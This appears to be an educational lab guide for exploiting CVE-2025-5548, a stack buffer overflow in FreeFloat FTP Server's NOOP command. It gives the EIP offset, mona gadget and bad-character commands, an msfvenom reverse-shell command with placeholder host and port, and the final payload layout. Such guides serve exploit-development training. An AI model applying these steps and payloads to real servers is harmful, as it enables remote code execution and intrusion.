
# 🔎 Methodology for Exploiting CVE-2025-5548

This document describes a **structured methodology for exploiting CVE-2025-5548**, a vulnerability affecting **FreeFloat FTP Server** that leads to a **stack-based buffer overflow**.

The guide walks through each phase of exploit development, from understanding the target to achieving **code execution**.

---

# 📚 Table of Contents

* [Step 0: Understanding the Target](#step-0-understanding-the-target)
* [Step 1: Fuzzing the Command](#step-1-fuzzing-the-command)
* [Step 2: Discover Offset to EIP Register](#step-2-discover-offset-to-eip-register)
* [Step 3: Control EIP](#step-3-control-eip)
* [Step 4: Find Bad Characters](#step-4-find-bad-characters)
* [Step 5: JMP ESP](#step-5-jmp-esp)
* [Step 6: Generate Shellcode](#step-6-generate-shellcode)
* [Step 7: Exploit Vulnerability (RCE / PrivEsc)](#step-7-exploit-vulnerability)

---

# 🧭 Step 0: Understanding the Target

Before beginning exploitation, it is important to understand **how the server processes input** and where the vulnerability occurs.

**FreeFloat FTP Server** is a legacy FTP service that listens on **TCP port 21** and processes commands through an internal **command dispatcher**. Because the software was written without modern security protections, several handlers rely on unsafe functions such as `strcpy`, which can lead to **stack buffer overflows**.

In this CVE, the vulnerable command is **NOOP**, which can trigger a classic buffer overflow.

## 💻 Notes

```
IDA -> New -> Open FTPServer.exe -> OK
View -> Open subviews -> Strings
Search -> "USER "
Double click -> USER
Right click -> Xrefs graph to ...
Follow -> sub_xxxxxx -> Command handler
Follow function calls -> Look for strcpy
```

---

📸 **Space for exercise screenshots**

```
[ espacio para capturas de pantalla del ejercicio ]
```

---

# 🧭 Step 1: Fuzzing the Command

Once the target is understood, the next step is to determine how the server reacts to **oversized input**.

This process is called **fuzzing**. The idea is to send progressively larger strings until the program **crashes or stops responding**.

If the server crashes while processing long input, it likely indicates a **buffer overflow vulnerability**.

## 💻 Notes

* Create a **Python socket script**
* Connect to **port 21**
* Authenticate with `USER` / `PASS`
* Send the `NOOP` command with a large payload
* Gradually increase the payload size

---

📸 **Space for exercise screenshots**

```
[ espacio para capturas de pantalla del ejercicio ]
```

---

# 🧭 Step 2: Discover Offset to EIP Register

After confirming the crash, we need to determine how many bytes are required to overwrite the **EIP register**.

The **EIP (Instruction Pointer)** controls the program execution flow. If we overwrite it, we can redirect execution to our own payload.

Instead of sending `"AAAA..."`, we send a **cyclic pattern**. When the crash occurs, the value found in EIP reveals the exact **offset** where the overwrite happens.

## 💻 Notes

Generate cyclic pattern:

```
(Windows)
!mona pattern_create 100

(Ubuntu)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
```

Python alternative:

```
python3 -c "length=100; import itertools; print(''.join([a+b+c for a,b,c in itertools.product('ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz','0123456789')])[:length])"
```

Generate larger pattern:

```
!mona pattern_create 400
```

Calculate offset:

```
!mona pattern_offset 41326941
!mona findmsp
```

Example result:

```
EIP contains normal pattern : 0x41326941 (offset 246)
```

Metasploit alternative:

```
pattern_offset.rb -l 400 -q 41326941
```

Output:

```
[*] Exact match at offset 246
```

---

📸 **Space for exercise screenshots**

```
[ espacio para capturas de pantalla del ejercicio ]
```

---

# 🧭 Step 3: Control EIP

After identifying the offset, we must verify that we can **overwrite the EIP register**.

To do this, we send a payload composed of:

* Padding until the offset
* A controlled value replacing EIP
* Optional data after EIP

If successful, the debugger will show the injected value inside **EIP**.

## 💻 Notes

Example payload:

```
"A" * 246 + "BBBB"
```

If the exploit works, **EIP will contain 0x42424242**.

---

📸 **Space for exercise screenshots**

```
[ espacio para capturas de pantalla del ejercicio ]
```

---

# 🧭 Step 4: Find Bad Characters

After controlling EIP, we must identify **bad characters**.

Some bytes cannot be used in payloads because they:

* Terminate strings
* Break command parsing
* Are modified during processing

These characters must be removed from the final shellcode.

## 💻 Notes

Common bad characters:

```
\x00  (Null byte)
\x0A  (New line)
\x0D  (Carriage return)
\xFF
```

Generate byte array:

Python:

```
for i in range(0,256): print('\\x%02X' % i, end='')
```

Bash:

```
for i in {0..255}; do printf "\\\x%02x" $i;done
```

Using Mona:

```
mkdir C:\Mona
!mona config -set workingfolder C:\Mona
!mona bytearray
```

Compare memory:

```
!mona compare -f C:\Mona\bytearray.bin -a ESP_ADDRESS
```

Remove bad characters iteratively:

```
!mona bytearray -b "\x00"
!mona bytearray -b "\x00\x0a"
!mona bytearray -b "\x00\x0a\x0d"
```

---

📸 **Space for exercise screenshots**

```
[ espacio para capturas de pantalla del ejercicio ]
```

---

# 🧭 Step 5: JMP ESP

Once we control EIP and know which characters are safe, the next step is to redirect execution to our **shellcode**.

Since the shellcode will be located on the **stack**, we overwrite EIP with the address of an instruction such as:

```
JMP ESP
```

This instruction redirects execution to the memory address stored in **ESP**, where our payload resides.

On **legacy systems (Windows XP / Windows 7)**, many modules have fixed addresses, making this step straightforward.

On **modern systems (Windows 10 / Windows 11)**, most modules use:

* **ASLR**
* **DEP**
* **SafeSEH**

This makes finding reliable gadgets more difficult.

For educational purposes, exploitation can still be demonstrated while running the program **inside a debugger**, where addresses remain stable during the session.

## 💻 Notes

Find modules:

```
!mona modules
```

Search JMP ESP:

```
!mona jmp -r esp -cpb "\x00\x0a\x0d"
```

Search instruction manually:

```
!mona asm -s "jmp esp"
```

Find opcode:

```
!mona find -s "\xff\xe4" -cpb "\x00\x0a\x0d"
```

CALL ESP:

```
!mona find -s "\xff\xd4" -cpb "\x00\x0a\x0d"
```

JMP [ESP]:

```
!mona find -s "\xff\x24\x24" -cpb "\x00\x0a\x0d"
```

Search ROP gadgets:

```
!mona rop -cpb "\x00\x0a\x0d"
```

---

📸 **Space for exercise screenshots**

```
[ espacio para capturas de pantalla del ejercicio ]
```

---

# 🧭 Step 6: Generate Shellcode

Once execution flow is redirected, we generate **shellcode** that performs the desired action.

Common payloads include:

* Reverse shell
* Bind shell
* Command execution

Example using **msfvenom**:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d" -f python
```

The bad characters discovered earlier must be excluded using the `-b` parameter.

---

📸 **Space for exercise screenshots**

```
[ espacio para capturas de pantalla del ejercicio ]
```

---

# 🧭 Step 7: Exploit Vulnerability (RCE / PrivEsc)

Finally, we build the full exploit payload:

```
[ padding ] + [ EIP overwrite ] + [ NOP sled ] + [ shellcode ]
```

Example structure:

```
"A"*246 + JMP_ESP + "\x90"*32 + shellcode
```

Once sent to the server, execution flow jumps to **ESP**, runs the shellcode, and provides **remote code execution (RCE)**.

Depending on the service privileges, this may also lead to **privilege escalation**.

---

📸 **Space for exercise screenshots**

```
[ espacio para capturas de pantalla del ejercicio ]
```

---

# 🏁 Conclusion

This methodology demonstrates a **classic stack-based buffer overflow exploitation workflow**, including:

* Reverse engineering the binary
* Fuzzing the vulnerable command
* Calculating the EIP offset
* Controlling execution flow
* Identifying bad characters
* Redirecting execution to shellcode

Although modern systems include strong protections such as **ASLR and DEP**, understanding this methodology remains fundamental for learning **exploit development and binary exploitation**.

---

⭐ If this guide was helpful, consider **starring the repository**.
